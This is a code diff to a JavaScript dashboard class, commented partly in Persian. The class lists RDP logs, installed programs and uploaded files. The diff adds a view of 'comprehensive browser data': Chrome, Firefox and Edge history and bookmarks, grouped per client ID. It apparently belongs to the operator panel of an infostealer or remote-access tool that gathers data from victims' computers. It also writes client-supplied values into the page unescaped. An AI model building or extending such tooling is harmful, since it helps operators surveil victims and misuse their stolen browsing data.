@@ -86,6 +86,8 @@ class DashboardManager {
         this.fetchRDPLogs(),
         this.fetchInstalledPrograms(),
         this.fetchUploadedFiles(),
+        // NEW: اضافه کردن fetch جدید
+        this.fetchComprehensiveBrowserData(),
       ]);
     } catch (error) {
       console.error("Error fetching data:", error);
@@ -169,6 +171,78 @@ class DashboardManager {
       console.error("Fetch error:", error);
       throw error;
     }
+  }
+
+  async fetchComprehensiveBrowserData() {
+    try {
+      const data = await this.fetchWithAuth("?get_comprehensive_browser_data");
+
+      if (data.error) {
+        console.error("Error:", data.error);
+        return;
+      }
+
+      this.renderComprehensiveBrowserData(
+        "comprehensive-browser-data",
+        data.comprehensive_browser_data
+      );
+    } catch (error) {
+      if (error.message === "Authentication required") return;
+      console.error("Error fetching comprehensive browser data:", error);
+      this.showError("Failed to fetch comprehensive browser data");
+    }
+  }
+
+  renderComprehensiveBrowserData(containerId, data) {
+    const container = document.getElementById(containerId);
+    if (!container) return;
+
+    if (data.length === 0) {
+      container.innerHTML = this.getEmptyState("No comprehensive browser data");
+      return;
+    }
+
+    container.innerHTML = data
+      .map((item) => this.createBrowserDataEntry(item))
+      .join("");
+  }
+
+  createBrowserDataEntry(data) {
+    const browsers = [];
+    if (data.chrome_data) browsers.push("Chrome");
+    if (data.firefox_data) browsers.push("Firefox");
+    if (data.edge_data) browsers.push("Edge");
+
+    let stats = "";
+    if (data.chrome_data) {
+      const chrome = data.chrome_data;
+      stats += `Chrome: ${chrome.history?.length || 0} history, ${
+        chrome.bookmarks?.length || 0
+      } bookmarks`;
+    }
+
+    return `
+        <div class="entry-item" data-type="browser_comprehensive" data-info='${JSON.stringify(
+          data
+        ).replace(
+          /'/g,
+          "&#39;"
+        )}' onclick="dashboard.openBrowserDataModal(this)">
+            <div class="entry-header">
+                <span class="entry-time">${new Date(
+                  data.collected_at
+                ).toLocaleString()}</span>
+                <span class="entry-status status-completed">${
+                  browsers.length
+                } Browsers</span>
+            </div>
+            <div class="entry-content">
+                <p><strong>Client:</strong> ${data.client_id}</p>
+                <p><strong>Browsers:</strong> ${browsers.join(", ")}</p>
+                <p><strong>Stats:</strong> ${stats}</p>
+            </div>
+        </div>
+    `;
   }
 
   async testConnection() {
